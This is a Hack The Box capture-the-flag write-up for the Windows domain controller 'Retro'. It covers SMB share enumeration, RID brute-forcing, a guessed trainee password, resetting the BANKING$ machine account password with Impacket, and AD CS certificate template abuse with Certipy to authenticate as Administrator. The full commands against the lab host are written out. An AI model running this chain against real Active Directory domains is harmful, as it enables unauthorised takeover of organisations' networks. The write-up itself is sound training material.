# Retro

**Retro** is a Windows-based Hack The Box machine focused on Active Directory enumeration, SMB share discovery, credential reuse, machine-account abuse, and Active Directory Certificate Services (AD CS).

## Overview

| Information          | Details                                  |
| -------------------- | ---------------------------------------- |
| Machine              | Retro                                    |
| Platform             | Hack The Box                             |
| OS                   | Windows Server 2022                      |
| IP Address           | `10.129.234.44`                          |
| Domain               | `retro.vl`                               |
| Hostname             | `DC.retro.vl`                            |
| Difficulty           | Easy                                     |
| Initial Access       | SMB enumeration and credential discovery |
| Privilege Escalation | AD CS                                    |
| Final Access         | Administrator                            |

---

# Enumeration

## Nmap Scan

We begin with a full TCP port scan against the target.

```text
Nmap scan report for 10.129.234.44
Host is up, received echo-reply ttl 127 (0.25s latency).

Not shown: 988 filtered tcp ports (no-response)

PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
```

The exposed services immediately suggest that the target is an **Active Directory Domain Controller**.

We then perform service and version detection.

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

The scan identifies the Active Directory domain as:

```text
retro.vl
```

and the domain controller as:

```text
DC.retro.vl
```

The RDP NTLM information also confirms:

```text
Target_Name: RETRO
NetBIOS_Domain_Name: RETRO
NetBIOS_Computer_Name: DC
DNS_Domain_Name: retro.vl
DNS_Computer_Name: DC.retro.vl
Product_Version: 10.0.20348
```

The host is therefore running **Windows Server 2022** and is acting as the domain controller.

---

# SMB Enumeration

Since TCP/445 is open, we enumerate the available SMB shares.

```bash
smbclient -L 10.129.234.44 -N
```

The server returns:

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
Notes           Disk
SYSVOL          Disk      Logon server share
Trainees        Disk
```

Two shares stand out:

```text
Notes
Trainees
```

The `Trainees` share can be accessed without credentials.

```bash
smbclient //10.129.234.44/Trainees -N
```

Listing the share gives:

```text
smb: \> ls

Important.txt
```

We download/read the file:

```bash
cat Important.txt
```

The contents state that users were having difficulty maintaining strong, unique passwords and that the administrators decided to bundle the trainees into a single account/password arrangement.

This suggests that **password reuse or weak shared credentials** may be worth investigating.

---

# User Enumeration

We use NetExec to perform RID brute-forcing against the SMB service.

```bash
netexec smb 10.129.234.44 -u 'guest' -p '' --rid-brute
```

The scan successfully authenticates as the guest account and reveals several domain accounts.

Among the discovered users are:

```text
RETRO\Administrator
RETRO\Guest
RETRO\krbtgt
RETRO\trainee
RETRO\BANKING$
RETRO\jburley
RETRO\tblack
```

It also reveals the `HelpDesk` group and several standard Active Directory groups.

The `BANKING$` account is particularly interesting because it is a computer account.

---

# Initial Access

## Trainee Account

Based on the information discovered in `Important.txt`, we test the `trainee` account using the same password.

The credentials are:

```text
Username: trainee
Password: trainee
```

We successfully access the `Notes` SMB share:

```bash
smbclient //10.129.234.44/Notes -U 'trainee%trainee'
```

Listing the share:

```text
smb: \> ls

ToDo.txt
user.txt
```

We have access to both `ToDo.txt` and the user flag.

---

## Notes Enumeration

We read `ToDo.txt`:

```bash
cat ToDo.txt
```

The contents are:

```text
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James
```

The note specifically references a **pre-created computer account**, which points us back toward the `BANKING$` account discovered during RID enumeration.

---

# Privilege Escalation

## BANKING$ Account

We attempt to use the `BANKING$` account with a likely default password:

```text
banking:banking
```

The initial attempt fails:

```bash
smbclient //10.129.234.44/Notes -U 'BANKING$%banking'
```

Result:

```text
session setup failed:
NT_STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

This indicates that the account exists but cannot be used in the normal way with the current password/account state.

---

## Changing the Computer Account Password

We use Impacket's `changepasswd.py` to change the password of the `BANKING$` account.

```bash
/opt/pipx/venvs/impacket/bin/changepasswd.py \
retro.vl/'banking$':banking@10.129.234.44 \
-newpass 'nk05052004!' \
-p rpc-samr
```

The new password is:

```text
nk05052004!
```

We then verify the credentials using CrackMapExec:

```bash
crackmapexec smb retro.vl \
-u 'banking$' \
-p 'nk05052004!'
```

The credentials are accepted:

```text
[+] retro.vl\banking$:nk05052004!
```

The notes therefore led us to a valid domain account that can be used for further Active Directory enumeration.

---

# Active Directory Certificate Services Enumeration

With valid credentials for `BANKING$`, we check whether the domain has Active Directory Certificate Services configured.

```bash
nxc ldap retro.vl \
-u "banking$" \
-p 'nk05052004!' \
-M adcs
```

The output identifies:

```text
Found PKI Enrollment Server: DC.retro.vl
Found CN: retro-DC-CA
```

This confirms that the domain has an AD CS deployment with:

```text
CA: retro-DC-CA
```

We then use Certipy to enumerate vulnerable certificate templates:

```bash
certipy-ad find \
-u 'banking$' \
-p 'nk05052004!' \
-dc-ip 10.129.234.44 \
-vulnerable \
-stdout
```

This identifies the certificate infrastructure and provides the path toward certificate-based authentication.

---

# Administrator Certificate Authentication

We proceed with Certipy using the discovered certificate configuration.

The attempted certificate request uses:

```text
CA: retro-DC-CA
Template: RetroClients
UPN: administrator@retro.vl
SID: S-1-5-21-2983547755-698260136-4283918172-500
```

The request is performed with:

```bash
certipy-ad req \
-u 'BANKING$@retro.vl' \
-k \
-target DC.retro.vl \
-ca 'retro-DC-CA' \
-template RetroClients \
-upn administrator@retro.vl \
-sid 'S-1-5-21-2983547755-698260136-4283918172-500' \
-key-size 4096
```

The notes show an initial request failure caused by DNS/NETBIOS resolution and connection issues:

```text
DNS resolution failed
The NETBIOS connection with the remote host timed out.
```

The certificate authentication step is then attempted with:

```bash
certipy-ad auth \
-pfx administrator.pfx \
-username administrator \
-domain retro.vl \
-dc-ip 10.129.234.44
```

This provides the route to authenticate as the domain Administrator.

---

# Root / Administrator Access

With Administrator authentication obtained, we use **Evil-WinRM** to access the system.

```text
Evil-WinRM PS C:\Users\Administrator>
```

We move to the Administrator desktop:

```powershell
cd Desktop
ls
```

The directory contains:

```text
Directory: C:\Users\Administrator\Desktop

Mode     LastWriteTime       Length Name
----     -------------       ------ ----
-a----   4/8/2025 8:11 PM       32  root.txt
```

The root flag is therefore located at:

```text
C:\Users\Administrator\Desktop\root.txt
```

The final Administrator access and root flag location are shown in the supplied notes.

---

# Attack Path Summary

```text
Nmap Enumeration
        |
        v
Active Directory Discovery
        |
        v
SMB Enumeration
        |
        v
Guest Access
        |
        v
Trainees Share
        |
        v
Important.txt
        |
        v
Trainee Credentials
        |
        v
Notes Share
        |
        v
ToDo.txt
        |
        v
BANKING$ Computer Account
        |
        v
Change BANKING$ Password
        |
        v
Valid Domain Credentials
        |
        v
AD CS Enumeration
        |
        v
Certificate Template Abuse
        |
        v
Administrator Certificate Authentication
        |
        v
Evil-WinRM
        |
        v
Administrator Access
        |
        v
Root Flag
```

---

# Key Takeaways

* **SMB enumeration** can expose shares containing sensitive operational information.
* Anonymous or guest SMB access should always be tested when SMB is exposed.
* Shared or predictable credentials can provide an initial foothold in an Active Directory environment.
* **RID brute-forcing** can reveal valid domain users and computer accounts.
* Computer accounts such as `BANKING$` can become important attack paths when their credentials or configuration are weak.
* **Active Directory Certificate Services (AD CS)** should be enumerated whenever it is present in an AD environment.
* Certificate templates and enrollment permissions can potentially lead to privileged authentication.
* Certipy is a useful tool for auditing and interacting with AD CS during authorized security assessments.
* Proper password management and certificate-template configuration are critical for securing Active Directory environments.

---

# Tools Used

* Nmap
* SMBClient
* NetExec
* CrackMapExec
* Impacket
* Certipy
* Evil-WinRM

---

# Conclusion

Retro demonstrates a classic Active Directory attack chain where information gathered from SMB shares leads to credential discovery, which then opens the door to deeper domain enumeration.

The attack begins with network and SMB enumeration, followed by guest access to the `Trainees` share. The discovered documentation points toward the `BANKING$` computer account. After changing its password, the account can be used to enumerate **Active Directory Certificate Services**.

From there, certificate-based authentication provides a path to **Administrator**, allowing access through Evil-WinRM and completion of the machine.

The most important lesson from Retro is that seemingly minor weaknesses—such as exposed SMB information, predictable credentials, and misconfigured certificate services—can be chained together to achieve full domain compromise.
